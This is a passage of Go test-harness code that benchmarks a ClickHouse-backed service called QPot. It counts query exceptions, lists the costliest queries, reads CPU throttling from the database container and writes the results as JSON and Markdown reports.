		WHERE event_time >= toDateTime(?, 'UTC') AND exception_code = 241 AND type IN ('ExceptionBeforeStart', 'ExceptionWhileProcessing')`, since)
	st.OtherExceptions = h.one(ctx, time.Minute, `SELECT count() FROM system.query_log
		WHERE event_time >= toDateTime(?, 'UTC') AND exception_code NOT IN (0, 241) AND type IN ('ExceptionBeforeStart', 'ExceptionWhileProcessing')`, since)
	qctx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	rows2, err := h.db.Query(qctx, `SELECT substring(replaceRegexpAll(any(query), '\\s+', ' '), 1, 160), count(), sum(query_duration_ms),
			avg(query_duration_ms), max(query_duration_ms), toUInt64(avg(read_rows)), max(memory_usage) / 1048576
		FROM system.query_log WHERE event_time >= toDateTime(?, 'UTC') AND type = 'QueryFinish' AND query NOT ILIKE '%system.%'
		GROUP BY normalized_query_hash ORDER BY sum(query_duration_ms) DESC LIMIT 10`, since)
	if err == nil {
		for rows2.Next() {
			var q benchQuery
			if rows2.Scan(&q.Query, &q.Count, &q.TotalMs, &q.AvgMs, &q.MaxMs, &q.AvgRows, &q.MaxMemMB) == nil {
				st.Queries = append(st.Queries, q)
			}
		}
		rows2.Close()
	}
	cancel()
	if throttled, periods := h.benchThrottle(ctx); periods > periodsBefore {
		st.CPUThrottledPct = 100 * float64(throttled-throttledBefore) / float64(periods-periodsBefore)
	}
	st.Healthy, st.HealthNote = h.healthy(ctx)
	h.logf("  measured %.0fs: slowest call %s; live %d accepted, %d lost, %d twice; unclassified up to %d (oldest waited %.0fs); database %.0f MB, %d refusals, CPU throttled %.0f%% of periods",
		st.Seconds, benchSlowest(st.API), st.LiveAccepted, st.LiveLost, st.LiveTwice, st.MaxUnclassified, st.ClassifyLagMax, st.MemoryMaxMB, st.MemoryRefusals, st.CPUThrottledPct)
	return st
}

// benchThrottle reads how many CPU periods the database container has had
// and in how many its CPU limit held it back (cgroup v2 cpu.stat).
func (h *harness) benchThrottle(ctx context.Context) (throttled, periods uint64) {
	out, err := docker(ctx, 20*time.Second, "exec", h.container("db"), "cat", "/sys/fs/cgroup/cpu.stat")
	if err != nil {
		return 0, 0
	}
	for _, line := range strings.Split(out, "\n") {
		k, v, _ := strings.Cut(line, " ")
		n, _ := strconv.ParseUint(strings.TrimSpace(v), 10, 64)
		switch k {
		case "nr_throttled":
			throttled = n
		case "nr_periods":
			periods = n
		}
	}
	return throttled, periods
}

func benchSlowest(calls []benchCall) string {
	var worst benchCall
	for _, c := range calls {
		if c.P95Ms >= worst.P95Ms {
			worst = c
		}
	}
	return fmt.Sprintf("%s (95%% within %.0f ms, longest %.0f ms, %d of %d failed)", worst.Path, worst.P95Ms, worst.MaxMs, worst.Failed, worst.Calls)
}

func (h *harness) benchWrite(r benchReport) {
	data, err := json.MarshalIndent(r, "", "  ")
	if err != nil {
		h.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(h.opt.reportDir, "bench-"+h.tag+".json"), data, 0o644); err != nil {
		h.t.Fatal(err)
	}
	var b strings.Builder
	fmt.Fprintf(&b, "# QPot database benchmark %s\n\n%v connections/s of live traffic, %v dashboards polling every %s, each size measured for %v. %v.\n\n",
		r.Tag, r.Options["rate_per_second"], r.Options["browsers"], benchPollEvery, r.Options["stage"], r.Options["version"])
	b.WriteString("| Events | On disk (MB) | Load (rows/s) | Live lost / twice | Unclassified, most | Oldest waited (s) | Database memory (MB) | CPU held back | Refused for memory | Other failed queries |\n|---|---|---|---|---|---|---|---|---|---|\n")
	for _, s := range r.Stages {
		fmt.Fprintf(&b, "| %d | %.0f | %.0f | %d / %d of %d | %d | %.0f | %.0f | %.0f%% | %d | %d |\n", s.Rows, s.TableMB, s.FillRowsPerSec,
			s.LiveLost, s.LiveTwice, s.LiveAccepted, s.MaxUnclassified, s.ClassifyLagMax, s.MemoryMaxMB, s.CPUThrottledPct, s.MemoryRefusals, s.OtherExceptions)
	}
	b.WriteString("\nThe worker at its limit, and a collector that sent rows again:\n\n| Events | Backlog | Classified per second | Seconds to the first | Rows sent again | First copy gone (s) | Last copy gone (s) | Left at the timeout | IDs stored twice at the end |\n|---|---|---|---|---|---|---|---|---|\n")
	for _, s := range r.Stages {
		fmt.Fprintf(&b, "| %d | %d | %.1f | %.0f | %d | %.0f | %.0f | %d / %d | %d |\n", s.Rows, s.Backlog.Events, s.Backlog.PerSecond, s.Backlog.StartSeconds,
			s.Replay.Copies, s.Replay.FirstSeconds, s.Replay.ClearedSeconds, s.Backlog.LeftAtTimeout, s.Replay.LeftAtTimeout, s.Replay.StoredTwiceLeft)
	}
	b.WriteString("\nAPI calls, milliseconds (median / 95th percentile / longest; failed of calls):\n\n| Call |")
	for _, s := range r.Stages {
		fmt.Fprintf(&b, " %d events |", s.Rows)
	}
	b.WriteString("\n|---|")
	b.WriteString(strings.Repeat("---|", len(r.Stages)))
	b.WriteString("\n")
	for i, p := range benchEndpoints {
		fmt.Fprintf(&b, "| `%s` |", p)
		for _, s := range r.Stages {
			if i < len(s.API) {
				c := s.API[i]
				fmt.Fprintf(&b, " %.0f / %.0f / %.0f; %d of %d |", c.P50Ms, c.P95Ms, c.MaxMs, c.Failed, c.Calls)
			}
		}
		b.WriteString("\n")
	}
	for _, s := range r.Stages {
		fmt.Fprintf(&b, "\nCostliest queries at %d events (count, total ms, average ms, longest ms, average rows read, most memory MB):\n\n", s.Rows)
		for _, q := range s.Queries {
			fmt.Fprintf(&b, "- %d, %d, %.0f, %d, %d, %.0f: `%s`\n", q.Count, q.TotalMs, q.AvgMs, q.MaxMs, q.AvgRows, q.MaxMemMB, strings.ReplaceAll(q.Query, "`", "'"))
		}
	}
	mdPath := filepath.Join(h.opt.reportDir, "bench-"+h.tag+".md")
	if err := os.WriteFile(mdPath, []byte(b.String()), 0o644); err != nil {
		h.t.Fatal(err)
	}
	h.logf("report: %s", mdPath)
	if !r.Finished.IsZero() {
		h.t.Log("\n" + b.String())
	}
}
